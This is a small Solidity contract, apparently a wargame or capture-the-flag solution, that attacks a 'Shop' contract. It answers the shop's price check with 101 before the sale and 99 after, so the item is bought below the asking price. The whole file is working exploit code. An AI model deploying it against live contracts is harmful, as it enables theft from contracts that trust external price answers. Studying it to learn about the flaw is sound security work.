pragma solidity ^0.8.0;

interface ShopIntf {
    function buy() external;
    function isSold() external view returns (bool);
    function price() external view returns (uint256);
}

contract SmartAttack {
    address immutable private shop;

    constructor(address _shop) {
        shop = _shop;
    }

    function attack() external {
        ShopIntf(shop).buy();
    }

    function price() external view returns (uint256) {
        if (ShopIntf(shop).isSold()) {
            return 99;
        } else {
            return 101;
        }
    }
}